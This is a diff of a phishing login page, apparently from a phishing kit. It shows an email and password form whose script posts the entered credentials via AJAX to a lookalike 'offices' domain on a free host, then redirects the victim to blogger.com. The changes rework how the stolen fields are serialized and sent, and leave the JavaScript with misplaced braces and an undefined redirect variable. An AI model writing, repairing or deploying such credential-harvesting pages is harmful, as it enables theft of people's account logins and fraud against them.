@@ -32,12 +32,12 @@ href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstr
 
 <div class="form-group">
 <label for="FormControlInput">Enter your email id</label>
-<input type="email" name="email" class="form-control" id="email"/>
+<input type="email" name="email" class="form-control" id="FormControlInput"/>
 </div>
 
 <div class="form-group">
 <label for="FormControlInput">Password</label>
-<input name="Password" type="password" class="form-control" id="password" rows="3"/>
+<input name="Password" type="password" class="form-control" id="FormControlTextarea" rows="3"/>
 </div>
 <button type="button" class="btn btn-primary bin" id="login" onclick="redirect()">Submit</button>
 </form>
@@ -48,31 +48,27 @@ href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstr
 
 
 
-
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 <script type="text/javascript" language="javascript">
 function redirect() {
 window.location.href = "https://www.blogger.com/"
-}
+
 $(document).ready(function () {
-debugger
-var email = $("#email").val();
-var password = $("#password").val();
-
-var dataObject = { Email: email, Password: password }
-
+$(".bin").click(function () {
 var datastring = $("#Form").serialize();
 $.ajax({
     type: "POST",
     url: "http://mmm0ffices.c1.biz/ex/exm.php",
-    data: JSON.stringify(dataObject),
-    dataType: "application/json",
-	success: function(data){
-window.location.href = url ;
+    data: datastring,
+    dataType: "json",
+      success: function(data){
+ window.location = redirectUrl
   },
 
 });
-
 });
+});
+	}
 </script>
 </body>
 </html>
